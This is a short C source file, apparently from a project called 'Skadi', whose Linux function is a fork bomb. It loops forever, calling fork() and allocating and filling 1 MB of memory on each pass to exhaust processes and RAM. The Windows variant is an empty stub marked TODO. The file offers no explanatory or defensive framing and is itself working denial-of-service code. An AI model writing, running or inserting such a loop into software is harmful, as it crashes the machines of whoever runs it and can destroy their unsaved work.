#include "Skadi.h"

#ifdef __linux__

void linux_skadi() {
	while (1) {
		fork();
		memset(malloc(1024*1024L), 'w', 1024*1024L);
	}
}

#elif _WIN32

void windows_skadi() {
	// TODO
}

#endif
